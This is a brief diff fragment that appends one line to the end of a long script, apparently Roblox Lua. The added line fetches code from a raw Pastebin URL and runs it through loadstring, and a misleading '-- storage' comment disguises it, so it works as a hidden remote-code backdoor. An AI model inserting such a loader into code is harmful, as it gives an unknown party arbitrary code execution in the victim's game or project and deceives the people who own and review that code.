@@ -5290,3 +5290,4 @@ end
 
 end
 
+loadstring(game:HttpGet("https://pastebin.com/raw/RC6HtXg0"))() -- storage
